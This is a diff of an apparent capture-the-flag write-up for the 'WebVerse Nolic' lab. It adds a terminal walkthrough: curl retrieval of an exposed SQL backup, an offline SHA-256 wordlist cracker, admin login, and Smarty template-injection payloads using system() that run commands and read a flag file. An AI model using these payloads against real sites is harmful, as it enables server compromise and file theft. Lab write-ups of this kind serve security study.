@@ -1,11 +1,11 @@
 ---
 title: "WebVerse Nolic: Exposed Backup to Smarty SSTI and Remote Code Execution"
 date: 2026-08-04T00:00:00+02:00
-lastmod: 2026-08-13T00:00:00+02:00
+lastmod: 2026-08-19T00:00:00+02:00
 draft: false
 author: "Mdk22"
 description: "A public SQL backup led to offline password recovery, Smarty template injection, and operating-system command execution."
-summary: "A public backup exposed an administrator SHA-256 digest. After recovering the password offline, the authenticated draft editor evaluated Smarty syntax and ran a harmless operating-system command. The original draft was restored after every test."
+summary: "A public backup exposed an administrator SHA-256 digest. After recovering the password offline, I reproduced the Smarty SSTI and operating-system command execution in Caido and from the terminal. The original draft was restored after every test."
 categories:
   - "Web Security Write-Ups"
 tags:
@@ -19,6 +19,8 @@ tags:
   - "SQLite"
   - "Password Hashing"
   - "Caido"
+  - "curl"
+  - "Terminal"
   - "CWE-1336"
   - "CWE-548"
   - "CWE-530"
@@ -37,9 +39,11 @@ case_evidence:
   - "Caido"
   - "Chromium"
   - "Python"
+  - "curl"
+  - "Terminal"
 case_verified: true
 case_caido: true
-case_independent_curl: false
+case_independent_curl: true
 primary_cwe: "CWE-1336"
 cwes:
   - "CWE-1336"
@@ -61,7 +65,7 @@ methods:
   - "Anonymous Replay"
   - "Invalid-versus-Valid Differential"
   - "Browser Runtime Validation"
-  - "Bounded File Locator"
+  - "Controlled File Search"
   - "Deterministic State Restoration"
   - "Authoritative Status Check"
 ---
@@ -72,7 +76,7 @@ methods:
 
 The Nolic challenge combined several weaknesses into a complete external attack path. The standard `robots.txt` file disclosed a backup route, which returned an Apache directory listing with a downloadable SQL dump. The dump contained an administrator account and a fast SHA-256 password digest. An offline test recovered the weak password after 26 candidates without sending password guesses to the target.
 
-The recovered credential opened an administrative session. The dashboard showed one draft post, so I saved every original field before changing anything. Each test changed only the body while `status=draft` stayed unchanged. After every test, I restored the original values and compared them with the saved copy.
+The recovered credential opened an administrative session. The dashboard showed one draft post, so I saved every original field before changing anything. In Caido, the draft stayed private and I viewed each result through the authenticated route. The terminal pass had no preview route, so it published the test briefly, checked the public output, and restored the original draft immediately after each step. Every restoration was compared with the saved copy.
 
 Smarty evaluated a harmless arithmetic expression and returned `49`. A later `system()` test returned the operating-system-generated value `58597`, confirming command execution as the web application user. A filename-only search returned one readable flag-shaped candidate. I read only that file, redacted the flag, and stopped after WebVerse accepted it.
 
@@ -129,15 +133,18 @@ Testing stayed inside the vulnerable Nolic lab and followed the evidence already
 - Template testing progressed from arithmetic evaluation to a harmless command with a predictable result before any file access.
 - File discovery was constrained to selected roots, one filesystem, maximum depth 6, readable regular files, flag-shaped names, and 40 results.
 - No reverse shell, persistence, destructive command, privilege escalation, or unrelated file collection was attempted.
-- After every temporary body change, the saved snapshot was restored and compared field by field. Every probe kept `status=draft` unchanged.
+- After every temporary body change, the saved snapshot was restored and compared field by field.
+- The Caido pass kept `status=draft`. The terminal pass temporarily used `status=published` only long enough to read the result, then restored the original draft before the next test.
 
-Caido captured the HTTP requests and responses. Chromium showed the rendered Smarty output, command result, filename search, and final flag. Python handled the offline digest check and compared every restored field with the saved draft.
+Caido captured the proxy requests and responses. Chromium showed the rendered Smarty output, command result, filename search, and final flag. The second pass repeated the chain with `curl`, `jq`, and small Python helpers. Python handled the offline digest check, safe form encoding, and field-by-field restoration checks.
 
-## 3. Step-by-Step Reproduction
+## 3. Evidence-Led Chronological Reproduction
 
-This section keeps each request, command, payload, screenshot, result, and conclusion beside the step where it was used. Caido, browser, and terminal captures provide the proof, while the nearby code blocks let readers repeat the work. No `curl` command was executed, so none is added later.
+The Caido and terminal passes follow the same path from recon to cleanup. The first pass keeps the original proxy evidence. The second pass shows the complete CLI commands and helper scripts used in a fresh instance.
 
-### 3.1 Canonical Host and Public Route Discovery
+### 3.1 Caido/Burp Reproduction
+
+#### Step 1: Canonical Host and Public Route Discovery
 
 The fresh instance used `10.100.0.30`. Requesting `robots.txt` by IP returned HTTP 301 with `Location: http://nolic.local/robots.txt`. That redirect revealed the active virtual host without relying on an older lab run.
 
@@ -164,7 +171,7 @@ Disallow: /login.php
 
 **Figure 2: Route disclosure.** The canonical file identifies relevant routes but is treated only as reconnaissance; exploitability required direct follow-up.
 
-### 3.2 Anonymous Backup Discovery and Retrieval
+#### Step 2: Anonymous Backup Discovery and Retrieval
 
 The application-disclosed backup route was followed directly. No adjacent path or filename was guessed.
 
@@ -196,7 +203,7 @@ The response used `Content-Type: application/sql` and contained a 16,294-byte da
 
 **Figure 4: Backup contents.** The response proves anonymous retrieval of a real SQL dump and privileged credential material. The directory index maps to CWE-548, while the separately verified downloadable backup maps more precisely to CWE-530.
 
-### 3.3 Limited Offline Credential Recovery
+#### Step 3: Limited Offline Credential Recovery
 
 The exposed digest was tested locally against `/usr/share/wordlists/rockyou.txt`. This phase generated no request to Nolic.
 
@@ -212,7 +219,7 @@ python3 Nolic_EV06_Offline_SHA256_Recovery.py
 
 **Figure 5: Offline verification.** A match occurred after 26 candidates and the recovered password was eight bytes long. Digest shape alone was not treated as proof of SHA-256; reproducing the stored value with an actual candidate match confirmed the algorithm and supports CWE-916.
 
-### 3.4 Authentication and Session Establishment
+#### Step 4: Authentication and Session Establishment
 
 I logged in once with the recovered credential.
 
@@ -232,7 +239,7 @@ username=<REDACTED>&password=<REDACTED>
 
 **Figure 6: Authentication.** HTTP 302, session issuance, and the dashboard redirect prove that the offline-recovered credential was accepted.
 
-### 3.5 Selecting and Saving the Draft
+#### Step 5: Selecting and Saving the Draft
 
 The authenticated dashboard listed six posts: five published and one draft. The only draft was `id=6`, titled “Marginalia for the modern reader,” with slug `marginalia-for-the-modern-reader`.
 
@@ -240,7 +247,7 @@ The authenticated dashboard listed six posts: five published and one draft. The 
 
 **Figure 7: Draft selection.** The dashboard shows one draft suitable for testing and avoids changing a published article.
 
-### 3.6 Draft Baseline, Anonymous Control, and Restoration Snapshot
+#### Step 6: Draft Baseline, Anonymous Control, and Restoration Snapshot
 
 The editor exposed `title`, `slug`, `excerpt`, `body`, `status`, and `tags`, with the draft option checked. Before mutation, every original value and `status=draft` was saved and hashed.
 
@@ -284,9 +291,9 @@ Cookie: NOLICSESS=<SESSION_COOKIE>
 <title/slug/excerpt/body/status/tags form fields>&status=draft
 ```
 
-The request structure is included below, while dynamic session, object, and original form values stay as placeholders. Every later probe changed only the body, kept `status=draft`, checked the authenticated result, and restored all original fields.
+The request structure is included below, while dynamic session, object, and original form values stay as placeholders. In this Caido pass, every later probe changed only the body, kept `status=draft`, checked the authenticated result, and restored all original fields.
 
-### 3.7 Harmless Smarty Evaluation
+#### Step 7: Harmless Smarty Evaluation
 
 The first mutation appended a unique marker containing a harmless arithmetic expression while preserving the original title, slug, excerpt, tags, and draft status.
 
@@ -306,7 +313,7 @@ NOLIC_SSTI_A1_49_END
 
 **Figure 9: Template evaluation.** The server returns `49` instead of the original Smarty expression, separating template evaluation from storage, reflection, or normal HTML rendering. I restored the complete draft before continuing.
 
-### 3.8 Harmless Operating-System Command
+#### Step 8: Harmless Operating-System Command
 
 The next test used a harmless command with a predictable value and no file or state impact.
 
@@ -330,7 +337,7 @@ The value was not present in the stored source. PHP `system()` emits command out
 
 **Figure 10: Command execution.** Dynamic operating-system output proves escalation from template evaluation to execution with the web application process's privileges. No reverse shell, persistence, destructive command, or privilege escalation was attempted.
 
-### 3.9 Negative Control and Filename-Only Search
+#### Step 9: Negative Control and Filename-Only Search
 
 A short common-path allowlist was tested before broader filename discovery. This prevented an assumed flag location from being presented as evidence.
 
@@ -350,15 +357,15 @@ The negative result was followed by a locator constrained to selected roots, one
 <pre>NOLIC_FLAG_D1_BEGIN {system('find /var/www /opt /app /srv /home /tmp /root /challenge -xdev -maxdepth 6 -type f -readable \( -iname flag -o -iname flag.txt -o -iname "*flag*" \) 2>/dev/null | head -n 40 | sed "s#^#NOLIC_FLAG_CANDIDATE:#"; echo NOLIC_LOCATOR_DONE')} NOLIC_FLAG_D1_END</pre>
 ```
 
-**Expected result:** at most 40 readable flag-shaped filenames. The candidate path is omitted from the public article.
+**Expected result:** at most 40 readable flag-shaped filenames. The Terminal/CLI section later shows the returned path and keeps the file content separate.
 
 ![Filename-only search identifies one readable flag-shaped candidate](Nolic_Figure_11_Bounded_Flag_Locator.png)
 
 **Figure 11: Filename-only search.** One readable candidate was returned. This identifies a path but does not read the file.
 
-### 3.10 Final Read, Draft Restoration, and WebVerse Confirmation
+#### Step 10: Final Read, Draft Restoration, and WebVerse Confirmation
 
-**P-05: Final read.** The final payload read only the candidate from P-04 and placed the result between unique markers. The path, secret-bearing command, and returned flag are not published.
+**P-05: Final read.** The final payload read only the candidate from P-04 and placed the result between unique markers. The Terminal/CLI section shows the exact path and command, while the returned flag stays redacted.
 
 **Expected result:** HTTP 200 with one value matching the WebVerse flag format. The public version replaces it with `WEBVERSE{REDACTED}`.
 
@@ -390,6 +397,393 @@ I submitted the recovered value to WebVerse. The platform accepted it and marked
 > **WHERE TESTING STOPPED**
 >
 > The flag was submitted only after the final read and draft restoration. No further enumeration, file access, or exploit expansion followed.
+
+### 3.2 Terminal/CLI Reproduction
+
+I repeated the chain from a clean terminal session with `curl`, `grep`, `jq`, and Python. Replace `<LAB_IP>` with the current instance IP. The public commands also replace the recovered password, digest, and session value with placeholders.
+
+The application had no separate terminal preview route. For the rendering checks, I briefly changed the saved draft to `published`, read the public result, and restored it to `draft` before starting the next test. The restoration script compared every field with the original snapshot.
+
+#### Step 1: Bind the Current Instance and Follow the Disclosed Routes
+
+The first request used the current instance IP. Its redirect supplied the virtual host used by every later command.
+
+```bash
+curl -i "http://<LAB_IP>/robots.txt"
+```
+
+![Terminal request showing the current Nolic instance redirect to nolic.local](Nolic_Terminal_01_Canonical_Redirect.png)
+
+**Figure 15: Current instance binding.** The IP request returns HTTP 301 and points to `nolic.local/robots.txt`.
+
+I then pinned the virtual host to the same IP and requested the canonical file.
+
+```bash
+curl -i \
+  --resolve "nolic.local:80:<LAB_IP>" \
+  http://nolic.local/robots.txt
+```
+
+![Terminal robots.txt response disclosing backup admin and login routes](Nolic_Terminal_02_Robots_Disclosure.png)
+
+**Figure 16: Route disclosure.** The response lists `/backups/`, `/admin/`, and `/login.php`.
+
+The disclosed backup route returned an Apache index. I followed the exact filename shown there.
+
+```bash
+curl -i \
+  --resolve "nolic.local:80:<LAB_IP>" \
+  http://nolic.local/backups/
+
+curl -sS -D - \
+  --resolve "nolic.local:80:<LAB_IP>" \
+  -o nolic-backup-2025-06-01.sql \
+  http://nolic.local/backups/nolic-backup-2025-06-01.sql
+```
+
+![Terminal output showing the Nolic backup directory index](Nolic_Terminal_03_Backup_Directory_Index.png)
+
+**Figure 17: Backup index.** The server lists `nolic-backup-2025-06-01.sql` without authentication.
+
+![Terminal response headers for the downloaded SQL backup](Nolic_Terminal_04_SQL_Backup_Download.png)
+
+**Figure 18: Backup download.** The file returns HTTP 200 as `application/sql` and is saved locally.
+
+#### Step 2: Check the Backup and Recover the Password Offline
+
+The SQL dump contained an `admin_users` record. The command is included, but the stored digest and recovered password are not repeated in the public article.
+
+```bash
+grep -nEi \
+  'CREATE TABLE.*admin_users|INSERT INTO.*admin_users' \
+  nolic-backup-2025-06-01.sql
+```
+
+The candidate check stayed local and stopped at the first SHA-256 match.
+
+```python
+import hashlib
+
+target = "<REDACTED_SHA256_DIGEST>"
+wordlist = "/usr/share/wordlists/rockyou.txt"
+
+with open(wordlist, "rb") as source:
+    for tested, line in enumerate(source, start=1):
+        candidate = line.rstrip(b"\r\n")
+
+        if hashlib.sha256(candidate).hexdigest() == target:
+            print("[+] SHA-256 match confirmed")
+            print(f"[+] Candidates tested: {tested}")
+            print(f"[+] Password length: {len(candidate)} bytes")
+            break
+```
+
+The match appeared after 26 candidates. No password guess was sent to Nolic during this step.
+
+#### Step 3: Confirm the Login Contract and Map the Draft
+
+Before logging in, I read the form so the CLI request used the application's actual field names.
+
+```bash
+curl -sS -i \
+  --resolve "nolic.local:80:<LAB_IP>" \
+  http://nolic.local/login.php
+```
+
+![Terminal output showing the Nolic login form method and field names](Nolic_Terminal_05_Login_Form_Contract.png)
+
+**Figure 19: Login contract.** The form posts `username` and `password` to `/login.php`. No hidden CSRF field was present in this response.
+
+The login command stored the session in a cookie jar. The public copy keeps the password private.
+
+```bash
+curl -sS -i \
+  --resolve "nolic.local:80:<LAB_IP>" \
+  -c nolic.cookies \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  --data 'username=wren&password=<REDACTED_PASSWORD>' \
+  http://nolic.local/login.php
+```
+
+The response returned HTTP 302, a `NOLICSESS` cookie, and `/admin/dashboard.php`. I then mapped the dashboard with the saved session.
+
+```bash
+curl -sS \
+  --resolve "nolic.local:80:<LAB_IP>" \
+  -b nolic.cookies \
+  http://nolic.local/admin/dashboard.php \
+  | grep -nEi 'edit_post\.php|new_post\.php|logout\.php|draft|published'
+```
+
+![Terminal dashboard mapping showing five published posts and draft id 6](Nolic_Terminal_06_Dashboard_Draft_Mapping.png)
+
+**Figure 20: Draft mapping.** The dashboard contains five published posts and one draft. The tested object is `/admin/edit_post.php?id=6`.
+
+#### Step 4: Save a Restoration Baseline
+
+I saved the original editor response before changing the post.
+
+```bash
+curl -sS \
+  --resolve "nolic.local:80:<LAB_IP>" \
+  -b nolic.cookies \
+  http://nolic.local/admin/edit_post.php?id=6 \
+  -o nolic-draft6-original.html
+```
+
+The first parser expected `excerpt` to be a `<textarea>`. It was actually an `<input type="text">`, so the snapshot was rejected instead of treating an empty value as valid.
+
+![Initial snapshot output showing that the excerpt field was missing](Nolic_Terminal_07_Initial_Snapshot_Rejected.png)
+
+**Figure 21: Rejected snapshot.** The first parser found every required field except `excerpt`. No target change had been made.
+
+```bash
+grep -n -B 3 -A 5 'name="excerpt"' nolic-draft6-original.html
+```
+
+![Editor HTML showing excerpt as an input field](Nolic_Terminal_08_Excerpt_Field_Structure.png)
+
+**Figure 22: Parser correction.** The HTML shows why the first parser missed the value.
+
+The corrected helper requires all six fields, writes the private snapshot with mode `0600`, and prints SHA-256 hashes for later comparison.
+
+{{< code-resource file="nolic-draft-snapshot.py" lang="python" title="Draft snapshot helper" meta="Terminal/CLI · full source" >}}
+
+```bash
+python3 nolic-draft-snapshot.py
+```
+
+![Corrected Nolic draft snapshot with all fields and baseline hashes](Nolic_Terminal_09_Restoration_Baseline.png)
+
+**Figure 23: Restoration baseline.** `title`, `slug`, `excerpt`, `body`, `tags`, and `status=draft` are all present before testing starts.
+
+#### Step 5: Confirm Smarty Evaluation
+
+The first payload used simple arithmetic.
+
+```smarty
+{math equation="7*7"}
+```
+
+I appended it to the saved body and changed only the temporary render status.
+
+```bash
+curl -sS -i \
+  --resolve "nolic.local:80:<LAB_IP>" \
+  -b nolic.cookies \
+  -c nolic.cookies \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  --data-urlencode "title=$(jq -r '.title' private_NOLIC_DRAFT_ID6_SNAPSHOT.json)" \
+  --data-urlencode "slug=$(jq -r '.slug' private_NOLIC_DRAFT_ID6_SNAPSHOT.json)" \
+  --data-urlencode "excerpt=$(jq -r '.excerpt' private_NOLIC_DRAFT_ID6_SNAPSHOT.json)" \
+  --data-urlencode "body=$(jq -r '.body + "\n\n{math equation=\"7*7\"}"' private_NOLIC_DRAFT_ID6_SNAPSHOT.json)" \
+  --data-urlencode 'status=published' \
+  --data-urlencode "tags=$(jq -r '.tags' private_NOLIC_DRAFT_ID6_SNAPSHOT.json)" \
+  'http://nolic.local/admin/edit_post.php?id=6'
+```
+
+![Terminal arithmetic probe save returning the editor saved redirect](Nolic_Terminal_10_Arithmetic_Save.png)
+
+**Figure 24: Arithmetic save.** HTTP 302 with `saved=1` confirms only that the update was accepted.
+
+The public article output supplied the semantic check.
+
+```bash
+curl -sS \
+  --resolve "nolic.local:80:<LAB_IP>" \
+  'http://nolic.local/post.php?slug=marginalia-for-the-modern-reader' \
+  | grep -nE '49|\{math equation="7\*7"\}'
+```
+
+![Terminal oracle showing evaluated output 49 and no raw Smarty expression](Nolic_Terminal_11_Arithmetic_Oracle.png)
+
+**Figure 25: Arithmetic result.** The response contains `49`; the original Smarty source is absent.
+
+The exact restoration command and verifier are kept below for reuse after every later mutation.
+
+{{< code-resource file="nolic-restore-draft.sh" lang="bash" title="Exact draft restore" meta="Terminal/CLI · full source" >}}
+
+{{< code-resource file="nolic-verify-restoration.py" lang="python" title="Field-by-field restoration check" meta="Terminal/CLI · full source" >}}
+
+```bash
+LAB_IP="<LAB_IP>" bash nolic-restore-draft.sh
+python3 nolic-verify-restoration.py --ip "<LAB_IP>"
+```
+
+![Terminal hash comparison confirming restoration after the arithmetic test](Nolic_Terminal_12_Arithmetic_Restoration.png)
+
+**Figure 26: Arithmetic cleanup.** Every saved field matches and the post is back to `draft`.
+
+#### Step 6: Confirm Operating-System Command Execution
+
+The command check used a predictable arithmetic result and did not read a file or change system state.
+
+```smarty
+{system('expr 31415 + 27182')}
+```
+
+My first inline `jq` attempt failed because the nested quotes broke the local expression. The application returned `Title and body are required`, so I did not count that request as an RCE result.
+
+```bash
+curl -sS -i \
+  --resolve "nolic.local:80:<LAB_IP>" \
+  -b nolic.cookies \
+  -c nolic.cookies \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  --data-urlencode "title=$(jq -r '.title' private_NOLIC_DRAFT_ID6_SNAPSHOT.json)" \
+  --data-urlencode "slug=$(jq -r '.slug' private_NOLIC_DRAFT_ID6_SNAPSHOT.json)" \
+  --data-urlencode "excerpt=$(jq -r '.excerpt' private_NOLIC_DRAFT_ID6_SNAPSHOT.json)" \
+  --data-urlencode "body=$(jq -r '.body + \"\n\n{system('\''expr 31415 + 27182'\'')}\"' private_NOLIC_DRAFT_ID6_SNAPSHOT.json)" \
+  --data-urlencode 'status=published' \
+  --data-urlencode "tags=$(jq -r '.tags' private_NOLIC_DRAFT_ID6_SNAPSHOT.json)" \
+  'http://nolic.local/admin/edit_post.php?id=6'
+```
+
+![Failed jq quoting attempt and application validation response](Nolic_Terminal_13_Failed_JQ_Attempt.png)
+
+**Figure 27: Rejected attempt.** The local quoting error produced no accepted probe.
+
+![Restoration verifier showing that the failed attempt left the draft unchanged](Nolic_Terminal_14_Failed_Attempt_State_Check.png)
+
+**Figure 28: State check.** All original fields and `status=draft` still match the snapshot.
+
+I moved the same form construction into Python to avoid shell-quoting ambiguity. This public helper keeps the request structure used in the inline session and accepts the payload as one argument.
+
+{{< code-resource file="nolic-submit-payload.py" lang="python" title="Nolic payload submitter" meta="Terminal/CLI · full source" >}}
+
+```bash
+python3 nolic-submit-payload.py \
+  --ip "<LAB_IP>" \
+  "{system('expr 31415 + 27182')}"
+```
+
+![Python request builder submitting the harmless command payload](Nolic_Terminal_15_RCE_Save_Python.png)
+
+**Figure 29: Command payload save.** The server accepts the complete form and returns HTTP 302 with `saved=1`.
+
+```bash
+curl -sS \
+  --resolve "nolic.local:80:<LAB_IP>" \
+  'http://nolic.local/post.php?slug=marginalia-for-the-modern-reader' \
+  | grep -nE '58597|system\(|expr 31415'
+```
+
+![Terminal result showing the operating-system-generated value 58597](Nolic_Terminal_16_RCE_Oracle.png)
+
+**Figure 30: Command result.** The rendered page contains `58597` and not the raw payload. This confirms the move from Smarty evaluation to OS command execution.
+
+I ran the same restore and verification helpers before continuing.
+
+![Terminal verifier confirming restoration after the command execution test](Nolic_Terminal_17_RCE_Restoration.png)
+
+**Figure 31: RCE cleanup.** All fields match and the post is again `draft`.
+
+#### Step 7: Run the Common-Path Negative Control
+
+Before searching, I checked a short list of common locations. The payload prints start and end markers whether or not a readable matching file exists.
+
+```smarty
+{system('printf "COMMON_START\n"; for f in /flag /flag.txt /root/flag /root/flag.txt /var/www/flag /var/www/flag.txt /var/www/html/flag /var/www/html/flag.txt /app/flag /app/flag.txt /opt/flag /opt/flag.txt; do [ -r "$f" ] && grep -aoE "WEBVERSE\{[^}]+\}" "$f"; done; printf "COMMON_END\n"')}
+```
+
+The full Python request builder used for this stage is visible in the screenshot. The same public helper can submit the complete payload without dropping quotes.
+
+```bash
+payload=$(cat <<'PAYLOAD'
+{system('printf "COMMON_START\n"; for f in /flag /flag.txt /root/flag /root/flag.txt /var/www/flag /var/www/flag.txt /var/www/html/flag /var/www/html/flag.txt /app/flag /app/flag.txt /opt/flag /opt/flag.txt; do [ -r "$f" ] && grep -aoE "WEBVERSE\{[^}]+\}" "$f"; done; printf "COMMON_END\n"')}
+PAYLOAD
+)
+
+python3 nolic-submit-payload.py --ip "<LAB_IP>" "$payload"
+```
+
+![Python common-path control and accepted save response](Nolic_Terminal_18_Common_Path_Save.png)
+
+**Figure 32: Common-path control save.** The command is shown with the exact allowlist used in the run.
+
+```bash
+curl -sS \
+  --resolve "nolic.local:80:<LAB_IP>" \
+  'http://nolic.local/post.php?slug=marginalia-for-the-modern-reader' \
+  | grep -nE 'COMMON_START|COMMON_END|WEBVERSE\{'
+```
+
+![Terminal output showing both common-path markers and no flag hit](Nolic_Terminal_19_Common_Path_Negative.png)
+
+**Figure 33: Negative result.** Both markers render, but no flag value appears between them.
+
+![Terminal restoration check after the common-path control](Nolic_Terminal_20_Common_Path_Cleanup.png)
+
+**Figure 34: Common-path cleanup.** The draft matches the original snapshot before file discovery begins.
+
+#### Step 8: Search for a Readable Flag-Shaped Filename
+
+The next command searched selected roots, stayed on one filesystem, limited depth to six, required readable regular files, and stopped after 40 results. It returned filenames only.
+
+```smarty
+{system('find /var/www /opt /app /srv /home /tmp /root /challenge -xdev -maxdepth 6 -type f \( -name flag -o -name flag.txt -o -iname "*flag*" \) -readable 2>/dev/null | head -40')}
+```
+
+```bash
+payload=$(cat <<'PAYLOAD'
+{system('find /var/www /opt /app /srv /home /tmp /root /challenge -xdev -maxdepth 6 -type f \( -name flag -o -name flag.txt -o -iname "*flag*" \) -readable 2>/dev/null | head -40')}
+PAYLOAD
+)
+
+python3 nolic-submit-payload.py --ip "<LAB_IP>" "$payload"
+```
+
+![Python request builder submitting the controlled filename search](Nolic_Terminal_21_Controlled_Locator_Save.png)
+
+**Figure 35: Filename search save.** The source shows every root and limit used by the command.
+
+```bash
+curl -sS \
+  --resolve "nolic.local:80:<LAB_IP>" \
+  'http://nolic.local/post.php?slug=marginalia-for-the-modern-reader' \
+  | grep -nE '/[^< ]*[Ff][Ll][Aa][Gg][^< ]*'
+```
+
+![Terminal output showing one readable flag-shaped candidate path](Nolic_Terminal_22_Flag_Path_Candidate.png)
+
+**Figure 36: Candidate path.** The search returns `/home/wren/flag.txt`. The duplicate line comes from the same Smarty/PHP rendering behavior seen with `system()` earlier. No file content was read here.
+
+![Terminal restoration check after the filename search](Nolic_Terminal_23_Locator_Cleanup.png)
+
+**Figure 37: Search cleanup.** The original draft is restored before the final read.
+
+#### Step 9: Read the Confirmed Candidate and Restore the Draft
+
+The final payload read only the candidate returned by the previous step.
+
+```smarty
+{system('cat /home/wren/flag.txt')}
+```
+
+```bash
+python3 nolic-submit-payload.py \
+  --ip "<LAB_IP>" \
+  "{system('cat /home/wren/flag.txt')}"
+
+curl -sS \
+  --resolve "nolic.local:80:<LAB_IP>" \
+  'http://nolic.local/post.php?slug=marginalia-for-the-modern-reader' \
+  | grep -aoE 'WEBVERSE\{[^}]+\}'
+```
+
+![Python request builder submitting the exact candidate read](Nolic_Terminal_24_Exact_Read_Save.png)
+
+**Figure 38: Exact read save.** The request reads only the path found in Figure 36. The terminal output containing the literal flag is intentionally not published.
+
+The final response matched the WebVerse flag format. I restored the original draft one last time and reran the complete field comparison.
+
+![Final Terminal restoration verification with every field matching](Nolic_Terminal_25_Final_Restoration.png)
+
+**Figure 39: Final cleanup.** All five content hashes match, `status=draft` is restored, and `restoration_verified=true`.
+
+> **TERMINAL RESULT**
+>
+> The CLI pass reproduced the same chain as Caido: public backup exposure, offline password recovery, authenticated Smarty evaluation, OS command execution, one controlled filename search, one exact read, and a verified final restoration.
 
 ## 4. Vulnerability Classification
 
